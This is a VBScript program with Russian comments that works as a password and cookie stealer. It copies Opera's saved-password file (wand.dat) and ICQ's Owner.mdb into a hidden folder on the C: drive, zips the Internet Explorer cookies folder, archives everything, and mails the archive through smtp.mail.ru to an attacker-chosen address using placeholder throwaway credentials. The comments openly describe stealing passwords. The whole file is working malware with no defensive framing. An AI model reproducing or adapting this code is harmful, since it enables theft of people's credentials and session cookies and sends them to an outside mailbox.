Const FOF_SIMPLEPROGRESS = 256 
Dim MySource, MyTarget, MyHex, MyBinary, i 
Dim oShell, oCTF 
Dim oFileSys 
dim winShell 
dim newfolderpath
dim t
On Error Resume Next
'Создаем временную папку для записи нужных нам результатов (лучше, если название будет УНИКАЛЬНОЕ, чтобы не было конфликтов)
'==========================================================
h = Hour(Now)
m = Minute(Now)
s = Second(Now)
t = date() & "-" & h & "-" & m & "-" & s
dim filesys, newfolder 
newfolderpath = "c:\12345" ' Название временной папки
set filesys=CreateObject("Scripting.FileSystemObject") 
If Not filesys.FolderExists(newfolderpath) Then 
   Set newfolder = filesys.CreateFolder(newfolderpath) 
End If
set filesys=Nothing
Set newfolder=Nothing
'============================================
'тырим пароли от Оперы и icq 6 и icq6.5 , если асеку включена нехера непридёт
Set FileSystemObject = CreateObject("scripting.filesystemobject") 
set WshShell1 = WScript.CreateObject("WScript.Shell")
str = "C:\Documents and Settings\" & WshShell1.ExpandEnvironmentStrings("%USERNAME%")  & "\Application Data\Opera\Opera\profile\wand.dat" 
If FileSystemObject.fileExists(str) = True Then 
FileSystemObject.copyfile "C:\Documents and Settings\" & WshShell1.ExpandEnvironmentStrings("%USERNAME%")  & "\Application Data\Opera\Opera\profile\wand.dat" ,"C:\12345\wand.dat" 
FileSystemObject.copyfile "C:\Documents and Settings\" & WshShell1.ExpandEnvironmentStrings("%USERNAME%")  & "\Application Data\ICQ\здесь icq который хотм стырить\Owner.mdb" ,"C:\12345\Owner.mdb"
Else  
End If
'============================================
' Тырим куки IE
Const ForReading = 1, ForWriting = 2, ForAppending = 8 
Dim MyZipName 
Dim oApp, oFolder, oFile 
set WshShell1 = WScript.CreateObject("WScript.Shell") 
filePath = "C:\Documents and Settings\" & WshShell1.ExpandEnvironmentStrings("%USERNAME%")  & "\Cookies" 'Тут указываем, то что архивируем.
set WshShell1 = Nothing
MySource = filePath
MyTarget = newfolderpath & "\" & t & "-" & "ie_cookie.zip"
archPath_IE = t & "-" & "ie_cookie.zip"
MyHex = Array(80, 75, 5, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0) 
For i = 0 To UBound(MyHex) 
MyBinary = MyBinary & Chr(MyHex(i)) 
Next 
Set oShell = CreateObject("WScript.Shell") 
Set oFileSys = CreateObject("Scripting.FileSystemObject") 
Set oCTF = oFileSys.CreateTextFile(MyTarget, True) 
oCTF.Write MyBinary 
oCTF.Close 
Set oCTF = Nothing 
Set oApp = CreateObject("Shell.Application") 
Set oFolder = oApp.NameSpace(MySource) 
If Not oFolder Is Nothing Then 
oApp.NameSpace(MyTarget).CopyHere oFolder.Items 
End If 
wScript.Sleep(5000) 
Set oFile = Nothing 
On Error Resume Next 
Do While (oFile Is Nothing) 
Set oFile = oFileSys.OpenTextFile(MyTarget, ForAppending, False) 
If Err.number <> 0 then 
Err.Clear 
wScript.Sleep 3000 
End If 
Loop 
Set oFile=Nothing 
Set oFileSys=Nothing
'============================================ 
'скрипт который архивирует папку 12345 с пасами
Dim arrResult
arrResult = ZipFolder( "C:\12345", "C:\12345.zip" )
If arrResult(0) <> 0 Then
    WScript.Echo "ERROR " & Join( arrResult, vbCrLf )
End If
Function ZipFolder( myFolder, myZipFile )
    Dim objApp, objFSO, objTxt
    Const ForWriting = 2
    If Right( myFolder, 1 ) <> "\" Then
        myFolder = myFolder & "\"
    End If
    On Error Resume Next
    Set objFSO = CreateObject( "Scripting.FileSystemObject" )
    Set objTxt = objFSO.OpenTextFile( myZipFile, ForWriting, True )
    objTxt.Write "PK" & Chr(5) & Chr(6) & String( 18, Chr(0) )
    objTxt.Close
    Set objTxt = Nothing
    Set objFSO = Nothing
    If Err Then
        ZipFolder = Array( Err.Number, Err.Source, Err.Description )
        Err.Clear
        On Error Goto 0
        Exit Function
    End If
    Set objApp = CreateObject( "Shell.Application" )
    objApp.NameSpace( myZipFile ).CopyHere objApp.NameSpace( myFolder ).Items
    If Err Then
        ZipFolder = Array( Err.Number, Err.Source, Err.Description )
        Set objApp = Nothing
        Err.Clear
        On Error Goto 0
        Exit Function
    End If
    Do Until objApp.NameSpace( myZipFile ).Items.Count _
           = objApp.NameSpace( myFolder  ).Items.Count
        WScript.Sleep 200
    Loop
    Set objApp = Nothing
    If Err Then
        ZipFolder = Array( Err.Number, Err.Source, Err.Description )
        Err.Clear
        On Error Goto 0
        Exit Function
    End If
    On Error Goto 0
    ZipFolder = Array( 0, "", "" )
End Function
'==============================================
'отправка на мыло
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
Call SendPost("smtp.mail.ru","КУДА ПРИДУТ КУКИ","ЛЕВОЕ МЫЛО","passi_lamera","hacked_by_hack-win32")
Function SendPost(strSMTP_Server,strTo,strFrom,strSubject,strBody)
Set iMsg=CreateObject("CDO.Message")
Set iConf=CreateObject("CDO.Configuration")
Set Flds=iConf.Fields
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusing")=2
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate")=1
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername")="ЛОГИН ЛЕВОГО МЫЛА"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword")="ПАРОЛЬ ЛЕВОГО МЫЛА"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver")="smtp.mail.ru"
Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport")=25
Flds.Update
iMsg.Configuration=iConf
iMsg.To=strTo
iMsg.From=strFrom
iMsg.Subject=strSubject
iMsg.TextBody=strBody
iMsg.AddAttachment "C:\12345.zip"
iMsg.Send
End Function
Set iMsg=Nothing
Set iConf=Nothing
Set Flds=Nothing